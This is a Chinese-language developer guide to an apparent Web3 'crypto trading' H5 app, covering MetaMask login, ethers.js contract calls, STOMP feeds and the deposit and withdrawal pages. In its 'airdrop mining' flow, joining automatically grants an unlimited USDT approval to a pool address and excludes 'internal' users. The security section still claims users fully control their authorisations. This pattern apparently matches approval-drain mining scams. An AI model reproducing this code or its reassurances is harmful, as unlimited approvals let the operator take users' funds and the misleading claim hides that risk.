# Blockchain 项目完整讲解

## 📋 项目概述

**项目名称**: blockchain  
**项目类型**: Web3 加密货币交易平台 H5 应用  
**访问地址**: https://h5.ecobytecloud.shop  
**技术栈**: React 18 + TypeScript + Vite + Zustand + TanStack Query + ethers.js

### 核心功能
1. **钱包连接与管理** - MetaMask 钱包集成
2. **空投挖矿** - 流动性挖矿池参与
3. **现货交易** - 加密货币兑换
4. **合约交易** - 永续合约交易
5. **资产管理** - 充值、提现、资产查看
6. **实时行情** - WebSocket 实时市场数据

---

## 🏗️ 项目架构

### 目录结构
```
blockchain/
├── src/
│   ├── abi/              # 智能合约 ABI 定义
│   ├── api/              # API 接口封装
│   ├── assets/           # 静态资源
│   ├── components/       # 公共组件
│   ├── const/            # 常量配置
│   ├── contracts/        # 智能合约交互类
│   ├── hooks/            # 自定义 Hooks
│   ├── layout/           # 布局组件
│   ├── locales/          # 国际化配置
│   ├── router/           # 路由配置
│   ├── store/            # Zustand 状态管理
│   ├── types/            # TypeScript 类型定义
│   ├── utils/            # 工具函数
│   ├── views/            # 页面组件
│   ├── App.tsx           # 应用入口
│   └── main.tsx          # 渲染入口
├── package.json
├── vite.config.ts
└── .env
```

---

## 🔑 核心技术栈详解

### 1. **状态管理 - Zustand**

项目使用 Zustand 进行轻量级状态管理，主要 Store 包括：

#### [walletStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/walletStore.ts) - 钱包状态管理
```typescript
interface IWalletState {
  provider: ethers.BrowserProvider | null    // Web3 Provider
  signer: ethers.JsonRpcSigner | null        // 签名器
  address: string | null                      // 钱包地址
  chainId: string | number | undefined        // 链 ID
  connected: boolean                          // 连接状态
  ethBalance: string | null                   // ETH 余额
  isApprove: boolean                          // 是否已授权
}
```

**核心方法**:
- [connect()](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/walletStore.ts#106-133) - 连接 MetaMask 钱包
- [disconnect()](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/walletStore.ts#159-171) - 断开钱包连接
- [updateWalletState()](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/walletStore.ts#46-77) - 更新钱包状态
- [getBalance()](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/walletStore.ts#78-101) - 获取 ETH 余额
- [switchToChain()](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/walletStore.ts#134-158) - 切换区块链网络

**监听机制**:
```typescript
// 监听账户变化
window.ethereum.on('accountsChanged', handleAccountsChanged)
// 监听网络变化
window.ethereum.on('chainChanged', handleChainChanged)
```

#### [userStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/userStore.ts) - 用户状态管理
```typescript
interface UserState {
  token?: string              // 登录 Token
  userInfo?: any             // 用户信息
  liveChatToken?: string     // 客服聊天 Token
}
```

使用 `persist` 中间件持久化到 `localStorage`。

#### 其他 Store
- [marketStompStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/marketStompStore.ts) - 市场 WebSocket 连接管理
- [orderStompStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/orderStompStore.ts) - 订单 WebSocket 连接管理
- [balanceStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/balanceStore.ts) - 余额状态
- [poolStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/poolStore.ts) - 矿池状态
- [chartStore.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/store/chartStore.ts) - 图表配置

---

### 2. **Web3 集成 - ethers.js**

#### MetaMask 钱包连接流程

```typescript
// 1. 检测 MetaMask
if (!window.ethereum) {
  console.warn('MetaMask not detected')
  return
}

// 2. 创建 Provider
const provider = new ethers.BrowserProvider(window.ethereum)

// 3. 请求账户授权
await window.ethereum.request({ method: 'eth_requestAccounts' })

// 4. 获取 Signer 和地址
const signer = await provider.getSigner()
const address = await signer.getAddress()

// 5. 获取网络信息
const network = await provider.getNetwork()
const chainId = network.chainId.toString()
```

#### 智能合约交互

**ERC20 合约类** ([contracts/erc20Contract.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/contracts/erc20Contract.ts)):

```typescript
export class Erc20Contract {
  private contract: Contract
  private decimals: number

  constructor(signerOrProvider: any, chainId?: string | number) {
    const usdtAddress = getUsdtAddress(chainId)
    this.decimals = getUsdtDecimals(chainId)
    this.contract = new Contract(usdtAddress, erc20ABI, signerOrProvider)
  }

  // 授权 USDT
  async approveUsdt(amount: string, spender: string): Promise<any> {
    const tx = await this.contract.approve(spender, amount)
    return tx.hash
  }

  // 获取授权额度
  async getUsdtAllowance(owner: string, spender: string): Promise<any> {
    const allowance = await this.contract.allowance(owner, spender)
    return allowance.toString()
  }

  // 获取 USDT 余额
  async getUsdtBalance(address: string): Promise<any> {
    const balance = await this.contract.balanceOf(address)
    return balance.toString()
  }

  // 转账 USDT
  async transferUsdt(to: string, amount: string): Promise<any> {
    const tx = await this.contract.transfer(to, amount)
    return tx.hash
  }
}
```

**支持的区块链网络**:
- 以太坊主网 (Chain ID: 1)
- BSC 主网 (Chain ID: 56)
- 测试网 (Goerli, BSC Testnet)

---

### 3. **路由系统 - React Router v7**

#### 路由配置 ([router/index.tsx](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/router/index.tsx))

```typescript
export const router: IAppRouteObject[] = [
  {
    id: 'layout',
    element: (
      <RouteGuard>
        <ScrollToTop />
        <Layout />
      </RouteGuard>
    ),
    children: [
      { path: '/home', element: lazyLoad(lazy(() => import('@/views/home'))) },
      { path: '/mining', element: lazyLoad(lazy(() => import('@/views/mining'))) },
      { path: '/perpetualContract/:symbol', element: ... },
      { path: '/trendDetails/:symbol', element: ... },
      { path: '/assetsCenter/assets', element: ... },
      { path: '/recharge/rechargePage', element: ... },
      { path: '/withdraw/withdrawPage', element: ... },
      // ... 更多路由
    ],
  },
  { path: '/', element: <Navigate to="/mining" /> },
]
```

#### 路由守卫 ([router/RouteGuard.tsx](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/router/RouteGuard.tsx))

**核心功能**: 确保用户已连接钱包并完成登录

```typescript
export const RouteGuard: React.FC<RouteGuardProps> = ({ children }) => {
  const { connected, isConnecting, address, signer } = useWalletStore()
  const { token } = useUserStore()

  // 1. 检测 MetaMask
  useEffect(() => {
    if (typeof window !== 'undefined' && !window.ethereum) {
      navigate('/redirect', { replace: true })
    }
  }, [])

  // 2. 钱包登录流程
  const handleWalletLogin = async () => {
    if (!address || token) return

    // 2.1 请求签名消息
    const { data: message } = await mutateAsync({ address })
    
    // 2.2 用户签名
    const signature = await signer?.signMessage(message)
    
    // 2.3 验签登录
    await login({ address, message, sign: signature })
  }

  // 3. 未连接或未登录时显示 Loading
  if (isConnecting || !connected || !token) {
    return <ConnectLoading loadingText={loadingText} />
  }

  return <>{children}</>
}
```

**登录流程**:
1. 用户连接 MetaMask 钱包
2. 后端生成随机签名消息 (`/auth/genMsgByWallet`)
3. 用户通过 MetaMask 签名消息
4. 后端验证签名并返回 Token (`/auth/loginByWallet`)
5. Token 存储到 `userStore` 并持久化

---

### 4. **数据请求 - TanStack Query**

#### 基础用法

```typescript
// 查询示例 - 获取用户信息
export const useGetUserInfo = () => {
  const { token } = useUserStore()
  const { setUserInfo } = useUserStore()

  return useQuery({
    queryKey: ['userInfo', token],
    queryFn: async () => {
      const res = await getUserInfo()
      setUserInfo(res.data)
      return res.data
    },
    enabled: !!token,
    refetchInterval: 10000, // 每 10 秒刷新
  })
}

// 变更示例 - 钱包登录
export const useLoginByWallet = () => {
  const { setToken } = useUserStore()

  const { mutateAsync } = useMutation({
    mutationFn: loginByWallet,
    onSuccess: (res) => {
      setToken(res.data.token)
    },
  })

  return { login: mutateAsync }
}
```

---

### 5. **WebSocket 实时通信 - STOMP**

项目使用 STOMP 协议进行实时数据通信，主要有两个 WebSocket 连接：

#### Market WebSocket - 市场行情

```typescript
export const useConnectMarketStomp = () => {
  const { token } = useUserStore()
  const client = useRef<Client>()

  useEffect(() => {
    if (!token) return

    // 创建 STOMP 客户端
    client.current = new Client({
      brokerURL: 'wss://api.bizarrebiscuit.com/market-ws',
      connectHeaders: { Authorization: `Bearer ${token}` },
      
      onConnect: () => {
        console.log('Market WebSocket 连接成功')
        // 订阅市场数据
        client.current?.subscribe('/topic/market', (message) => {
          const data = JSON.parse(message.body)
          // 处理市场数据
        })
      },
      
      onStompError: (frame) => {
        console.error('Market WebSocket 错误:', frame)
      },
    })

    client.current.activate()

    return () => {
      client.current?.deactivate()
    }
  }, [token])
}
```

#### Order WebSocket - 订单更新

用于实时接收订单状态变化、成交通知等。

---

## 🎯 核心业务流程

### 1. 空投挖矿流程

**页面**: [/views/mining/index.tsx](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/views/mining/index.tsx)

```typescript
const handleJoin = async () => {
  // 1. 检查是否为内部用户
  if (userInfo?.internal) {
    Toast.show({ content: '内部用户无法参与' })
    return
  }

  // 2. 切换到主网
  await switchToMainnet()

  // 3. 检查 ETH 余额（用于 Gas）
  if (Number(ethBalance) <= 0) {
    handleShowModal() // 显示余额不足提示
    return
  }

  // 4. 授权 USDT
  await handleApproveInfinite()
}
```

**授权流程** ([hooks/useContract.ts](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/hooks/useContract.ts)):

```typescript
const handleApproveInfinite = async () => {
  // 1. 检查 Signer
  if (!signer) {
    return Promise.reject(new Error('请先连接钱包'))
  }

  // 2. 切换到主网
  await switchToMainnet()

  // 3. 授权无限额度
  const infiniteAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
  const txHash = await erc20Contract.approveUsdt(infiniteAmount, poolAddress)

  // 4. 等待交易确认后刷新余额
  setTimeout(() => {
    fetchBalance()
    fetchAllowance()
  }, 3000)

  return txHash
}
```

**为什么需要授权？**
- 智能合约需要从用户钱包转移 USDT
- 用户必须先授权合约可以操作的 USDT 额度
- 授权后，合约才能执行 [transferFrom](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/contracts/erc20Contract.ts#68-81) 操作

---

### 2. 现货交易流程

**页面**: `/views/exchange/exchangePage.tsx`

1. 选择交易对（如 BTC/USDT）
2. 输入交易数量
3. 查看实时汇率
4. 确认交易
5. 提交订单到后端
6. 后端处理资产转换

---

### 3. 永续合约交易

**页面**: `/views/perpetualContract/:symbol/index.tsx`

**核心功能**:
- 实时 K 线图（使用 `klinecharts` 库）
- 订单簿（买卖盘深度）
- 开仓/平仓操作
- 杠杆设置
- 止盈止损

**实时数据订阅**:
```typescript
// 订阅 K 线数据
client.subscribe(`/topic/kline/${symbol}/${interval}`, (message) => {
  const klineData = JSON.parse(message.body)
  updateChart(klineData)
})

// 订阅订单簿
client.subscribe(`/topic/orderbook/${symbol}`, (message) => {
  const orderBook = JSON.parse(message.body)
  updateOrderBook(orderBook)
})
```

---

### 4. 充值流程

**页面**: `/views/recharge/rechargePage.tsx`

1. 选择充值币种（USDT, BTC, ETH 等）
2. 选择充值网络（ERC20, TRC20, BEP20）
3. 显示充值地址和二维码
4. 用户从外部钱包转账
5. 后端监听区块链交易
6. 到账后更新用户余额

---

### 5. 提现流程

**页面**: `/views/withdraw/withdrawPage.tsx`

1. 选择提现币种
2. 输入提现地址
3. 输入提现数量
4. 查看手续费
5. 提交提现申请
6. 后端审核（可能需要人工审核）
7. 审核通过后发起链上转账

---

## 🛠️ 关键 Hooks 详解

### [useContract](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/hooks/useContract.ts#9-104) - 智能合约交互

```typescript
export function useContract() {
  const { signer, provider, address, chainId } = useWalletStore()
  const [balance, setBalance] = useState('0')
  const [allowance, setAllowance] = useState('0')

  // 创建 ERC20 合约实例
  const erc20Contract = useMemo(
    () => new Erc20Contract(signer || provider, chainId),
    [signer, provider, chainId]
  )

  // 获取 USDT 余额
  const fetchBalance = async () => {
    if (!provider || !address) return
    const balanceWei = await erc20Contract.getUsdtBalance(address)
    setBalance(formatUsdtAmount(balanceWei))
  }

  // 获取授权额度
  const fetchAllowance = async () => {
    if (!provider || !address) return
    const allowanceWei = await erc20Contract.getUsdtAllowance(address, poolAddress)
    setAllowance(formatUsdtAmount(allowanceWei))
  }

  return {
    erc20Contract,
    balance,
    allowance,
    fetchBalance,
    fetchAllowance,
    handleApproveInfinite,
  }
}
```

### `useFetchMarkets` - 获取市场列表

用于获取所有可交易的币种对及其实时价格。

### `useWebsocket` - 通用 WebSocket Hook

封装了 WebSocket 连接、重连、心跳等逻辑。

---

## 🎨 UI 组件库

### Antd Mobile
项目使用 `antd-mobile` 作为 UI 组件库，适配移动端。

常用组件:
- `Toast` - 轻提示
- [Modal](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/views/mining/index.tsx#40-82) - 弹窗
- `Tabs` - 标签页
- `Popup` - 弹出层
- `Input` - 输入框
- `Button` - 按钮

### 自定义组件

#### `Header` - 页面头部
- 返回按钮
- 标题
- 菜单按钮

#### `Sider` - 侧边栏
- 导航菜单
- 钱包信息
- 语言切换

#### `ConnectLoading` - 连接加载
- 显示钱包连接状态
- 显示登录进度

#### `CustomerService` - 客服组件
- 集成 LiveChat Widget
- 支持在线客服

---

## 🌐 国际化 - i18next

```typescript
// 配置文件: src/locales/index.ts
import i18n from 'i18next'
import { initReactI18next } from 'react-i18next'
import LanguageDetector from 'i18next-browser-languagedetector'

i18n
  .use(LanguageDetector)
  .use(initReactI18next)
  .init({
    resources: {
      en: { translation: enTranslation },
      zh: { translation: zhTranslation },
    },
    fallbackLng: 'en',
    interpolation: { escapeValue: false },
  })

// 使用
const { t } = useTranslation()
<div>{t('home.welcome')}</div>
```

支持语言:
- 英文 (en)
- 中文 (zh)

---

## 📱 移动端适配

### PostCSS px-to-viewport

自动将 px 转换为 vw，实现移动端适配。

```javascript
// postcss.config.cjs
module.exports = {
  plugins: {
    'postcss-px-to-viewport': {
      viewportWidth: 375,  // 设计稿宽度
      unitPrecision: 5,
      viewportUnit: 'vw',
      selectorBlackList: [],
      minPixelValue: 1,
      mediaQuery: false,
    },
  },
}
```

### Tailwind CSS

使用 Tailwind CSS 进行样式开发，配合 Less 模块化。

---

## 🔐 安全机制

### 1. 钱包签名登录
- 使用 MetaMask 签名验证用户身份
- 无需传统密码，更安全

### 2. Token 认证
- 所有 API 请求携带 Bearer Token
- Token 存储在 localStorage

### 3. 智能合约授权
- 用户完全控制授权额度
- 可随时撤销授权

### 4. 网络切换保护
- 自动检测当前网络
- 提示用户切换到正确网络

---

## 🚀 如何快速上手

### 1. 环境准备
```bash
# Node.js 版本要求
node -v  # v18.x.x 或更高

# 安装依赖
pnpm install

# 启动开发服务器
pnpm run dev
```

### 2. 安装 MetaMask
- 浏览器安装 MetaMask 扩展
- 创建或导入钱包
- 切换到以太坊主网

### 3. 理解核心流程
1. **钱包连接**: `walletStore.connect()`
2. **签名登录**: [RouteGuard](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/router/RouteGuard.tsx#15-87) 自动处理
3. **合约交互**: 通过 [useContract](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/hooks/useContract.ts#9-104) Hook
4. **实时数据**: WebSocket 订阅

### 4. 添加新功能的步骤

#### 示例：添加一个新的交易对页面

**Step 1: 创建页面组件**
```typescript
// src/views/newTradePair/index.tsx
export default function NewTradePair() {
  const { t } = useTranslation()
  
  return (
    <div>
      <Header title={t('nav.newTradePair')} />
      {/* 页面内容 */}
    </div>
  )
}
```

**Step 2: 添加路由**
```typescript
// src/router/index.tsx
{
  path: '/newTradePair/:symbol',
  element: lazyLoad(lazy(() => import('@/views/newTradePair'))),
}
```

**Step 3: 创建 API 接口**
```typescript
// src/api/newTrade.ts
import request from '@/utils/request'

export const getTradeInfo = async (symbol: string) => {
  return await request.get(`/trade/${symbol}`)
}
```

**Step 4: 创建自定义 Hook**
```typescript
// src/hooks/trade/useTradeInfo.ts
import { useQuery } from '@tanstack/react-query'
import { getTradeInfo } from '@/api/newTrade'

export const useTradeInfo = (symbol: string) => {
  return useQuery({
    queryKey: ['tradeInfo', symbol],
    queryFn: () => getTradeInfo(symbol),
    enabled: !!symbol,
  })
}
```

**Step 5: 在组件中使用**
```typescript
export default function NewTradePair() {
  const { symbol } = useParams()
  const { data, isLoading } = useTradeInfo(symbol!)
  
  if (isLoading) return <Loading />
  
  return <div>{/* 使用 data */}</div>
}
```

---

## 🐛 常见问题与调试

### 1. MetaMask 未检测到
```typescript
if (!window.ethereum) {
  console.error('请安装 MetaMask')
  // 跳转到引导页
  navigate('/redirect')
}
```

### 2. 网络不匹配
```typescript
const { chainId } = useWalletStore()

if (chainId !== DEFAULT_CHAIN_ID) {
  // 提示用户切换网络
  await switchToChain(DEFAULT_CHAIN_ID)
}
```

### 3. 授权失败
- 检查 Gas 费是否足够
- 检查 USDT 余额
- 查看 MetaMask 错误信息

### 4. WebSocket 断连
- 自动重连机制已内置
- 检查网络连接
- 查看 Token 是否过期

### 5. 调试技巧
```typescript
// 查看钱包状态
console.log(useWalletStore.getState())

// 查看用户状态
console.log(useUserStore.getState())

// 监听状态变化
useWalletStore.subscribe((state) => {
  console.log('Wallet state changed:', state)
})
```

---

## 📚 学习资源

### Web3 相关
- [ethers.js 文档](https://docs.ethers.org/)
- [MetaMask 开发文档](https://docs.metamask.io/)
- [以太坊开发指南](https://ethereum.org/en/developers/)

### React 生态
- [React 官方文档](https://react.dev/)
- [TanStack Query](https://tanstack.com/query/latest)
- [Zustand](https://github.com/pmndrs/zustand)

### 项目特定
- [Antd Mobile](https://mobile.ant.design/)
- [STOMP.js](https://stomp-js.github.io/)
- [KLineCharts](https://github.com/liihuu/KLineChart)

---

## 🎓 总结

这个项目是一个完整的 Web3 加密货币交易平台，核心特点：

1. **Web3 集成**: 深度集成 MetaMask，使用钱包签名登录
2. **智能合约交互**: 通过 ethers.js 与 ERC20 合约交互
3. **实时通信**: WebSocket 实时推送市场数据和订单更新
4. **状态管理**: Zustand 轻量级状态管理
5. **类型安全**: 完整的 TypeScript 类型定义
6. **移动优先**: 使用 Antd Mobile 和 vw 适配

**快速上手建议**:
1. 先理解 `walletStore` 和钱包连接流程
2. 学习 [RouteGuard](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/router/RouteGuard.tsx#15-87) 的登录机制
3. 掌握 [useContract](file:///Users/hello/Desktop/uniForexGroup/blockchain/src/hooks/useContract.ts#9-104) 的合约交互
4. 了解 WebSocket 实时数据订阅
5. 参考现有页面添加新功能

有任何问题，可以查看代码注释或参考相似功能的实现！
